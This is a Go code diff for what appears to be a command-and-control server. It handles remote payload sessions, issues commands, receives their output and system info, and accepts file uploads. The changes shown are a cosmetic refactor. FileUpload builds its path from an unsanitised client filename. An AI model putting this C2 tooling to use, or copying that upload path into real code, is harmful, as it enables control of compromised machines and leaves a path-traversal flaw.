@@ -4,7 +4,6 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
-	"io/ioutil"
 	"net/http"
 	"os"
 	"strconv"
@@ -20,7 +19,9 @@ func GetCmd(w http.ResponseWriter, req *http.Request) {
 		sessionObj, _ := GetSession(index)
 
 		if isNew {
-			cli.Print(GreenF("[+] New connection from %s with session id: %d\n", sessionObj.IP, index))
+			cli.Print(
+				GreenF("[+] New connection from %s with session id: %d\n", sessionObj.IP, index),
+			)
 			// if the session is new, get the system information
 			fmt.Fprint(w, "__sysinfo__")
 		} else {
@@ -60,7 +61,7 @@ func GetCmd(w http.ResponseWriter, req *http.Request) {
 // the output of a cmd executed by the payload
 func CmdOutput(w http.ResponseWriter, req *http.Request) {
 	if req.Method == http.MethodPost {
-		body, err := ioutil.ReadAll(req.Body)
+		body, err := io.ReadAll(req.Body)
 		defer req.Body.Close()
 		if err != nil {
 			cli.Print(RedF("[-] Got error:\n%s\n", err))
@@ -69,7 +70,11 @@ func CmdOutput(w http.ResponseWriter, req *http.Request) {
 
 		// close connection, the client will open a new one
 		w.Header().Set("Connection", "close")
-		cli.Printf("[+] Got response from session id %d:\n%s\n", FindSessionIndexByToken(req.Header.Get("token")), body)
+		cli.Printf(
+			"[+] Got response from session id %d:\n%s\n",
+			FindSessionIndexByToken(req.Header.Get("token")),
+			body,
+		)
 		fmt.Fprintf(w, "Successfully posted output")
 	}
 }
@@ -85,7 +90,7 @@ func FileUpload(w http.ResponseWriter, req *http.Request) {
 
 	// read the file data
 	defer file.Close()
-	bytes, err := ioutil.ReadAll(file)
+	bytes, err := io.ReadAll(file)
 	if err != nil {
 		cli.Print(RedF("[-] Error reading the uploaded file: %s\n", err))
 	}
@@ -93,7 +98,7 @@ func FileUpload(w http.ResponseWriter, req *http.Request) {
 	// create uploads dir if not existant yet
 	_ = os.Mkdir("uploads", 0755)
 	// read data into local file
-	err = ioutil.WriteFile("uploads/"+handler.Filename, bytes, 0755)
+	err = os.WriteFile("uploads/"+handler.Filename, bytes, 0755)
 	if err != nil {
 		cli.Print(RedF("[-] Error creating and reading into local file: %s\n", err))
 	}
@@ -150,10 +155,15 @@ func GetSysinfo(w http.ResponseWriter, req *http.Request) {
 	if req.Method == "POST" {
 		index := FindSessionIndexByToken(req.Header.Get("token"))
 		if index == -1 {
-			cli.Print(RedF("[-] Error while getting session from token: %s\n", ErrUnrecognizedSessionToken))
+			cli.Print(
+				RedF(
+					"[-] Error while getting session from token: %s\n",
+					ErrUnrecognizedSessionToken,
+				),
+			)
 			return
 		}
-		body, _ := ioutil.ReadAll(req.Body)
+		body, _ := io.ReadAll(req.Body)
 		defer req.Body.Close()
 
 		sessionObj, _ := GetSession(index)
